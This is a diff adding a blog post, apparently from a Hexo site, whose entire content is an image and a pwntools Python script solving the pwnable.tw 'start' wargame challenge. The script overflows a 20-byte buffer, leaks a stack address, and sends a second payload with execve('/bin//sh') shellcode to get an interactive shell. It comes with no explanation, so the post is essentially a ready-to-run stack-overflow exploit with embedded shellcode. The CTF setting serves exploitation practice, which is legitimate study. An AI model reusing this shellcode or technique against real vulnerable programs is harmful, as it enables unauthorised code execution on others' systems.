@@ -1123,7 +1123,10 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    
+    <h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p><img src="https://img.imgdb.cn/item/609031b1d1a9ae528f59b8f3.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">gadget = <span class="number">0x08048087</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(gadget)</span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">leak_shellcode_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">20</span> + p32(leak_shellcode_addr + <span class="number">20</span>) + shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
     
 
     
